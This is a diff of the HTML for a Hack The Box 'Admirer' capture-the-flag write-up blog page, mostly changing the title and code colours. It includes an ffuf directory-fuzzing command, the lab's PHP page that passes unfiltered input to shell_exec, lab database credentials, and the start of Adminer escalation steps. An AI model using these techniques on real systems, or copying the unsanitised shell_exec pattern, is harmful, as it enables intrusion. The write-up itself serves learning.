@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <title>
-        Hackthebox - Admirer Writeup - A personal cybersecurity blog
+        Hackthebox - Admirer Writeup - fmash16&#39;s blog
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -21,10 +21,10 @@
     
     <meta name="description" content="topics: fuzzing, linux, python path hijack, adminer exploit, mysql, sudo" />
     <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>Hackthebox - Admirer Writeup - A personal cybersecurity blog</title>
+    <title>Hackthebox - Admirer Writeup - fmash16&#39;s blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
+    <link rel="stylesheet" href="/css/style.min.bef22498336108fd63d73af3a80f7d93e90f4ab8174c15d0ce0fe149dcf0312b.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="Hackthebox - Admirer Writeup" />
@@ -444,7 +444,7 @@
 <li><strong>contacts.txt</strong></li>
 <li><strong>credentials.txt</strong></li>
 </ol>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt
 </code></pre></div><p><img src="/img/htb_admirer/5.png" alt=""></p>
 <p><img src="/img/htb_admirer/4.png" alt=""></p>
 <p>We find the following in the credentials.txt file.</p>
@@ -484,38 +484,38 @@ w0rdpr3ss01!
 <p><img src="/img/htb_admirer/7.png" alt=""></p>
 <p>Here, we can run a some queries about uptime, logged in users, crontab view and
 some intersting backup files of passwd, shadow and so on which are &ldquo;not working&rdquo; as per the file found in the backup as they require root privileges. The php is as follows:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">&lt;?php</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71">// Web Interface to the admin_tasks script
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#776e71">//
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#776e71"></span><span style="color:#815ba4">if</span>(<span style="color:#06b6ef">isset</span>(<span style="color:#ef6155">$_REQUEST</span>[<span style="color:#48b685">&#39;task&#39;</span>]))
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>{
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>  <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">$_REQUEST</span>[<span style="color:#48b685">&#39;task&#39;</span>];
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>  <span style="color:#815ba4">if</span>(<span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;1&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;2&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;3&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;4&#39;</span> <span style="color:#5bc4bf">||</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>     <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;5&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;6&#39;</span> <span style="color:#5bc4bf">||</span> <span style="color:#ef6155">$task</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;7&#39;</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>  {
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#776e71">/************************************************************************ *********
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#776e71">       Available options:
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#776e71">         1) View system uptime
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#776e71">         2) View logged in users
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#776e71">         3) View crontab (current user only)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#776e71">         4) Backup passwd file (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#776e71">         5) Backup shadow file (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span style="color:#776e71">         6) Backup web data (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#776e71">         7) Backup database (not working)
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span style="color:#776e71">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#776e71">         NOTE: Options 4-7 are currently NOT working because they need root privileges.
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#776e71">               I&#39;m leaving them in the valid tasks in case I figure out a way
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#776e71">               to securely run code as root from a PHP page.
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span style="color:#776e71">    ************************************************************************* *********/</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    <span style="color:#815ba4">echo</span> <span style="color:#06b6ef">str_replace</span>(<span style="color:#48b685">&#34;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#34;</span>, <span style="color:#48b685">&#34;&lt;br /&gt;&#34;</span>, <span style="color:#06b6ef">shell_exec</span>(<span style="color:#48b685">&#34;/opt/scripts/admin_tasks.sh
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#48b685"></span><span style="color:#f99b15">$task</span><span style="color:#48b685"> 2&gt;&amp;1&#34;</span>));
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>  }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>  <span style="color:#815ba4">else</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>  {
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>    <span style="color:#815ba4">echo</span>(<span style="color:#48b685">&#34;Invalid task.&#34;</span>);
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>  }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>}
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span style="color:#776e71">?&gt;</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">&lt;?php</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#999;font-style:italic">// Web Interface to the admin_tasks script
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic">//
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">if</span>(isset(<span style="color:#40ffff">$_REQUEST</span>[<span style="color:#ed9d13">&#39;task&#39;</span>]))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>  <span style="color:#40ffff">$task</span> = <span style="color:#40ffff">$_REQUEST</span>[<span style="color:#ed9d13">&#39;task&#39;</span>];
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>  <span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;1&#39;</span> || <span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;2&#39;</span> || <span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;3&#39;</span> || <span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;4&#39;</span> ||
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>     <span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;5&#39;</span> || <span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;6&#39;</span> || <span style="color:#40ffff">$task</span> == <span style="color:#ed9d13">&#39;7&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>  {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>    <span style="color:#ed9d13">/************************************************************************ *********
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#ed9d13">       Available options:
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#ed9d13">         1) View system uptime
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#ed9d13">         2) View logged in users
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#ed9d13">         3) View crontab (current user only)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#ed9d13">         4) Backup passwd file (not working)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#ed9d13">         5) Backup shadow file (not working)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#ed9d13">         6) Backup web data (not working)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#ed9d13">         7) Backup database (not working)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#ed9d13">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#ed9d13">         NOTE: Options 4-7 are currently NOT working because they need root privileges.
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span><span style="color:#ed9d13">               I&#39;m leaving them in the valid tasks in case I figure out a way
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span><span style="color:#ed9d13">               to securely run code as root from a PHP page.
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span><span style="color:#ed9d13">    ************************************************************************* *********/</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>    <span style="color:#6ab825;font-weight:bold">echo</span> str_replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#34;&lt;br /&gt;&#34;</span>, shell_exec(<span style="color:#ed9d13">&#34;/opt/scripts/admin_tasks.sh
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span><span style="color:#ed9d13"></span><span style="color:#ed9d13">$task</span><span style="color:#ed9d13"> 2&gt;&amp;1&#34;</span>));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>  }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>  <span style="color:#6ab825;font-weight:bold">else</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>  {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>    <span style="color:#6ab825;font-weight:bold">echo</span>(<span style="color:#ed9d13">&#34;Invalid task.&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>  }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span><span style="color:#cd2828;font-weight:bold">?&gt;</span>
 </code></pre></div><p>We see that the code does not filter our input $task which we can tamper with
 using curl or burpsuite.</p>
 <h4 id="db_adminphp">db_admin.php</h4>
@@ -531,37 +531,37 @@ one running on the site. The backed up one had a php code that tries to login
 to the sql server as the user waldo, but interestingly, with a password
 different from the one found in db_admin.php. Here, the password seems to have
 an error(?), with the mismatched &ldquo;.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">&lt;?php</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>   <span style="color:#ef6155">$servername</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;localhost&#34;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>   <span style="color:#ef6155">$username</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;waldo&#34;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>   <span style="color:#ef6155">$password</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;]F7jLHw:*G&gt;UPrTo}~A&#34;</span><span style="color:#06b6ef">d6b</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#48b685">   </span><span style="color:#f99b15">$dbname</span><span style="color:#48b685"> = &#34;</span><span style="color:#06b6ef">admirerdb</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#48b685">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#48b685">   // Create connection
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#48b685">   </span><span style="color:#f99b15">$conn</span><span style="color:#48b685"> = new mysqli(</span><span style="color:#f99b15">$servername</span><span style="color:#48b685">, </span><span style="color:#f99b15">$username</span><span style="color:#48b685">, </span><span style="color:#f99b15">$password</span><span style="color:#48b685">, </span><span style="color:#f99b15">$dbname</span><span style="color:#48b685">);
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#48b685">   // Check connection
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#48b685">   if (</span><span style="color:#f99b15">$conn-&gt;connect_error</span><span style="color:#48b685">) {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#48b685">       die(&#34;</span><span style="color:#06b6ef">Connection</span> <span style="color:#06b6ef">failed</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34; . </span><span style="color:#f99b15">$conn-&gt;connect_error</span><span style="color:#48b685">);
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#48b685">   }
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#48b685">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#48b685">   </span><span style="color:#f99b15">$sql</span><span style="color:#48b685"> = &#34;</span><span style="color:#06b6ef">SELECT</span> <span style="color:#5bc4bf">*</span> <span style="color:#06b6ef">FROM</span> <span style="color:#06b6ef">items</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#48b685">   </span><span style="color:#f99b15">$result</span><span style="color:#48b685"> = </span><span style="color:#f99b15">$conn-&gt;query</span><span style="color:#48b685">(</span><span style="color:#f99b15">$sql</span><span style="color:#48b685">);
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#48b685">
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span style="color:#48b685">   if (</span><span style="color:#f99b15">$result-&gt;num_rows</span><span style="color:#48b685"> &gt; 0) {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#48b685">       // output data of each row
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span style="color:#48b685">       while(</span><span style="color:#f99b15">$row</span><span style="color:#48b685"> = </span><span style="color:#f99b15">$result-&gt;fetch_assoc</span><span style="color:#48b685">()) {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">article</span> <span style="color:#06b6ef">class</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;thumb&#39;</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">a</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;&#34;.$row[&#34;image_path&#34;].&#34;&#39;</span> <span style="color:#06b6ef">class</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;image&#39;</span><span style="color:#5bc4bf">&gt;&lt;/</span><span style="color:#06b6ef">img</span> <span style="color:#06b6ef">src</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;&#34;.$row[&#34;thumb_path&#34;].&#34;&#39;</span> <span style="color:#06b6ef">alt</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;&#39;</span> <span style="color:#5bc4bf">/&gt;&lt;/</span><span style="color:#06b6ef">a</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">h2</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;.</span><span style="color:#f99b15">$row[&#34;title&#34;]</span><span style="color:#48b685">.&#34;</span><span style="color:#5bc4bf">&lt;/</span><span style="color:#06b6ef">h2</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">p</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;.</span><span style="color:#f99b15">$row[&#34;text&#34;]</span><span style="color:#48b685">.&#34;</span><span style="color:#5bc4bf">&lt;/</span><span style="color:#06b6ef">p</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span style="color:#48b685">           echo &#34;</span><span style="color:#5bc4bf">&lt;/</span><span style="color:#06b6ef">article</span><span style="color:#5bc4bf">&gt;</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#48b685">       }
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span style="color:#48b685">    } 
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span style="color:#48b685">    else {
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span style="color:#48b685">             echo &#34;</span><span style="color:#f99b15">0</span> <span style="color:#06b6ef">results</span><span style="color:#48b685">&#34;;
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span style="color:#48b685">         }
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span style="color:#48b685">    </span><span style="color:#f99b15">$conn-&gt;close</span><span style="color:#48b685">();
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span style="color:#48b685">?&gt;
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">&lt;?php</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>   <span style="color:#40ffff">$servername</span> = <span style="color:#ed9d13">&#34;localhost&#34;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>   <span style="color:#40ffff">$username</span> = <span style="color:#ed9d13">&#34;waldo&#34;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>   <span style="color:#40ffff">$password</span> = <span style="color:#ed9d13">&#34;]F7jLHw:*G&gt;UPrTo}~A&#34;</span>d6b<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#ed9d13">   </span><span style="color:#ed9d13">$dbname</span><span style="color:#ed9d13"> = &#34;</span>admirerdb<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#ed9d13">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#ed9d13">   // Create connection
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#ed9d13">   </span><span style="color:#ed9d13">$conn</span><span style="color:#ed9d13"> = new mysqli(</span><span style="color:#ed9d13">$servername</span><span style="color:#ed9d13">, </span><span style="color:#ed9d13">$username</span><span style="color:#ed9d13">, </span><span style="color:#ed9d13">$password</span><span style="color:#ed9d13">, </span><span style="color:#ed9d13">$dbname</span><span style="color:#ed9d13">);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#ed9d13">   // Check connection
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#ed9d13">   if (</span><span style="color:#ed9d13">$conn-&gt;connect_error</span><span style="color:#ed9d13">) {
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#ed9d13">       die(&#34;</span>Connection failed: <span style="color:#ed9d13">&#34; . </span><span style="color:#ed9d13">$conn-&gt;connect_error</span><span style="color:#ed9d13">);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#ed9d13">   }
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#ed9d13">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#ed9d13">   </span><span style="color:#ed9d13">$sql</span><span style="color:#ed9d13"> = &#34;</span>SELECT * FROM items<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#ed9d13">   </span><span style="color:#ed9d13">$result</span><span style="color:#ed9d13"> = </span><span style="color:#ed9d13">$conn-&gt;query</span><span style="color:#ed9d13">(</span><span style="color:#ed9d13">$sql</span><span style="color:#ed9d13">);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#ed9d13">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#ed9d13">   if (</span><span style="color:#ed9d13">$result-&gt;num_rows</span><span style="color:#ed9d13"> &gt; 0) {
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#ed9d13">       // output data of each row
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#ed9d13">       while(</span><span style="color:#ed9d13">$row</span><span style="color:#ed9d13"> = </span><span style="color:#ed9d13">$result-&gt;fetch_assoc</span><span style="color:#ed9d13">()) {
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#ed9d13">           echo &#34;</span>&lt;article class=<span style="color:#ed9d13">&#39;thumb&#39;</span>&gt;<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span><span style="color:#ed9d13">           echo &#34;</span>&lt;a href=<span style="color:#ed9d13">&#39;&#34;.$row[&#34;image_path&#34;].&#34;&#39;</span> class=<span style="color:#ed9d13">&#39;image&#39;</span>&gt;&lt;/img src=<span style="color:#ed9d13">&#39;&#34;.$row[&#34;thumb_path&#34;].&#34;&#39;</span> alt=<span style="color:#ed9d13">&#39;&#39;</span> /&gt;&lt;/a&gt;<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span><span style="color:#ed9d13">           echo &#34;</span>&lt;h2&gt;<span style="color:#ed9d13">&#34;.</span><span style="color:#ed9d13">$row[&#34;title&#34;]</span><span style="color:#ed9d13">.&#34;</span>&lt;/h2&gt;<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span><span style="color:#ed9d13">           echo &#34;</span>&lt;p&gt;<span style="color:#ed9d13">&#34;.</span><span style="color:#ed9d13">$row[&#34;text&#34;]</span><span style="color:#ed9d13">.&#34;</span>&lt;/p&gt;<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span><span style="color:#ed9d13">           echo &#34;</span>&lt;/article&gt;<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span><span style="color:#ed9d13">       }
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span><span style="color:#ed9d13">    } 
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span><span style="color:#ed9d13">    else {
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span><span style="color:#ed9d13">             echo &#34;</span><span style="color:#3677a9">0</span> results<span style="color:#ed9d13">&#34;;
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span><span style="color:#ed9d13">         }
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span><span style="color:#ed9d13">    </span><span style="color:#ed9d13">$conn-&gt;close</span><span style="color:#ed9d13">();
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span><span style="color:#ed9d13">?&gt;
 </span></code></pre></div><h2 id="privilege-escalation--user">Privilege escalation : User</h2>
 <hr>
 <h3 id="database-management-tool-adminer">Database management tool: Adminer</h3>
@@ -586,18 +586,18 @@ sources. We follow the steps as follows:</li>
 <li>Create a new database and add a new user with password and grant privileges
 to the created database. NExt we add a new table &lsquo;test&rsquo; to the database</li>
 </ul>
